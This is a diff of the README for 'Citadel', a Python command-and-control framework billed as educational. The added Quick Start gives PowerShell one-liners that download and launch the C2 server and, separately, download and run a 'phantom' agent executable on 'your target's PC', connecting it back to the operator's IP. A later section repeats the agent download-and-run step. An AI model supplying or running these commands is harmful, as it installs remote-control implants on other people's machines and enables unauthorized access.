@@ -2,10 +2,25 @@
 
 # Citadel C2 Framework
 
-Citadel is a C2 Framework built in python for purely educational purpose. It's litteraly just doesn't do anything other than create connection between two computers.
+Citadel is a C2 Framework built in python for purely educational purpose. It litteraly just doesn't do anything other than create connection between two computers.
 
 ## Quick Start
 
+Run this on ur PC:
+
+```Powershell
+Invoke-WebRequest -Uri "https://github.com/johntad110/citadel-c2/releases/download/v12-1-windows-latest/citadel_windows-latest.exe" -OutFile "citadel_server.exe"; Start-Process -FilePath ".\citadel_server.exe"
+```
+
+And then run this on your target's PC (replace `<Citadel_Server_IP>` with ur IP):
+
+```Powershell
+Invoke-WebRequest -Uri "https://github.com/johntad110/citadel-c2/releases/download/v12-1-windows-latest/phantom_windows-latest.exe" -OutFile "phantom_agent.exe"; Start-Process -FilePath ".\phantom_agent.exe" -ArgumentList "--c2-host", "<Citadel_Server_IP>"
+```
+
+---
+
+If you want to install from code
 ### Server Installation
 
 ```bash
@@ -23,7 +38,6 @@ python main.py --host 0.0.0.0 --port 8886
 ### Agent Deployment
 
 ```powershell
-# Windows (PowerShell)
 Invoke-WebRequest -Uri "https://github.com/johntad110/citadel-c2/releases/latest/download/phantom_windows.exe" -OutFile phantom.exe
 ./phantom.exe --c2-host YOUR_SERVER_IP --c2-port 8886
 ```
